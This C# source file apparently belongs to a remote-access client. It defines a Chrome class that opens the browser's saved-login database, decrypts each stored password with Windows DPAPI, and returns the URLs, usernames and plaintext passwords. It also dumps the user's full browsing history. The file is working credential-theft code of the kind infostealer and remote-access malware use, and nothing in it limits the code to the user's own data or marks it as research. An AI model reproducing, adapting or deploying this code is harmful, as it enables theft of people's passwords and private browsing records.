using RemoteClient.Browsers;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace RemoteClient
{
    public class Chrome
    {
        private string error = null;

        public DataTable FetchCredentials()
        {
            try
            {
                DataTable dt = new DataTable();
                dt.Columns.Add("No");
                dt.Columns.Add("URL");
                dt.Columns.Add("Username");
                dt.Columns.Add("Password");

                ChromePassReader reader = new ChromePassReader();
                int count = 1;
                foreach(CredentialModel cr in reader.ReadPasswords())
                {
                    DataRow dr = dt.NewRow();
                    dr[0] = count.ToString();
                    dr[1] = cr.Url;
                    dr[2] = cr.Username;
                    dr[3] = cr.Password;

                    dt.Rows.Add(dr);
                    count++;
                }

                return dt;
            }
            catch (Exception ex)
            {
                error = ex.ToString();
                return null;
            }
        }

        public DataTable FetchHistory()
        {
            try
            {
                SQLiteConnection conn = new SQLiteConnection(@"Data Source=C:\Users\" + Environment.UserName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History");
                conn.Open();
                string query = "SELECT * from urls";
                SQLiteDataAdapter da = new SQLiteDataAdapter(query, conn);
                DataTable dt = new DataTable();
                dt.Clear();
                da.Fill(dt);
                conn.Close();
                return dt;
            }
            catch (Exception ex)
            {
                error = ex.ToString();
                return null;
            }
        }

        public string Error()
        {
            return error;
        }

        private class ChromePassReader : IPassReader
        {
            public string BrowserName { get { return "Chrome"; } }

            private const string LOGIN_DATA_PATH = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";


            public IEnumerable<CredentialModel> ReadPasswords()
            {
                var result = new List<CredentialModel>();

                var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
                var p = Path.GetFullPath(appdata + LOGIN_DATA_PATH);

                if (File.Exists(p))
                {
                    using (var conn = new SQLiteConnection("Data Source={" + p + "};"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {
                            cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                            using (var reader = cmd.ExecuteReader())
                            {

                                if (reader.HasRows)
                                {
                                    while (reader.Read())
                                    {
                                        var pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));

                                        result.Add(new CredentialModel()
                                        {
                                            Url = reader.GetString(0),
                                            Username = reader.GetString(1),
                                            Password = pass
                                        });
                                    }
                                }
                            }
                        }
                        conn.Close();
                    }

                }
                else
                {
                    RemoteClient.LogError("Canno find chrome logins file");
                }
                return result;
            }

            private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
            {
                const int CHUNK_SIZE = 2 * 1024;
                byte[] buffer = new byte[CHUNK_SIZE];
                long bytesRead;
                long fieldOffset = 0;
                using (MemoryStream stream = new MemoryStream())
                {
                    while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                    {
                        stream.Write(buffer, 0, (int)bytesRead);
                        fieldOffset += bytesRead;
                    }
                    return stream.ToArray();
                }
            }
        }
    }

}
